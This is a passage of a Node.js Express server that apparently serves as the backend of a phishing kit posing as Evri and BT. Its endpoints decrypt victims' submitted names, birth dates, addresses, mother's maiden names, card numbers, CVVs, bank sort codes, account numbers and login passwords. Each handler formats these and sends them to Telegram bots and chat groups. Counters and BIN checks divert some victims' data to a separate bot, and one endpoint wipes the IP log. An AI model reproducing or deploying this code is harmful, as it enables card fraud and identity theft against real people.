    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (fpaysC == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            fpaysC = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriMannyGC:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1001708890887&text=Evri:\n${originalText}`
            );
            fpaysC += 1;
        }

        res.send("Update Completed");
    })
});

let capzEvri = 3

app.options('/tcapzEvri', cors())

app.post('/tcapzEvri', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (capzEvri == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            capzEvri = 0;
        } else if (bin === "542011") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Evri:\n${originalText}`
            );
            capzEvri += 1;
        }

        res.send("Update Completed");
    })
});

//BT
//BT
//BT

app.options('/@skiii719', cors())

app.post('/@skiii719', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/ssfinesse', cors())

app.post('/ssfinesse', (req, res) => {
    username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
    password = CryptoJS.AES.decrypt(req.body.password, '402312').toString(CryptoJS.enc.Utf8);
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    mmn = CryptoJS.AES.decrypt(req.body.mmn, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    ip = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Login Information ------------+\nEmail: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nMMN: ${mmn}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
            );
            skiii719 = 0;
        } else if (bin === "535666" || bankName === "SANTANDER") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BTSS:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=BT:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/removeips', cors())

app.post('/removeips', (req, res) => {
    ip = req.body.ip;

    content = ``
    fs.writeFile('ips.txt', content, err => {
        if (err) {
            console.error(err);
        } else {
            res.send("Update Completed");
        }
    })
});

app.listen(port, () => console.log(`Started server at port ` + port));